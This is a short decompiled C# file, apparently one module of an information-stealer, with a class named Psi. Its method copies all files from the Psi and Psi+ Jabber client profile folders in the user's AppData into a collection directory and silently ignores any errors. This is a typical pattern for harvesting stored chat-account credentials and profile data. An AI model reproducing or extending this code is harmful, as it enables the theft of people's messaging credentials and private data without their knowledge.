﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x0200005D RID: 93
	internal class Psi
	{
		// Token: 0x06000210 RID: 528 RVA: 0x0000CC34 File Offset: 0x0000AE34
		public static void Start(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Psi+\\profiles\\default\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + "\\Jabber\\Psi+\\profiles\\default\\");
					fileInfo.CopyTo(directorypath + "\\Jabber\\Psi+\\profiles\\default\\" + fileInfo.Name);
				}
			}
			catch
			{
			}
			try
			{
				foreach (FileInfo fileInfo2 in new DirectoryInfo(Help.AppData + "\\Psi\\profiles\\default\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + "\\Jabber\\Psi\\profiles\\default\\");
					fileInfo2.CopyTo(directorypath + "\\Jabber\\Psi\\profiles\\default\\" + fileInfo2.Name);
				}
			}
			catch
			{
			}
		}
	}
}
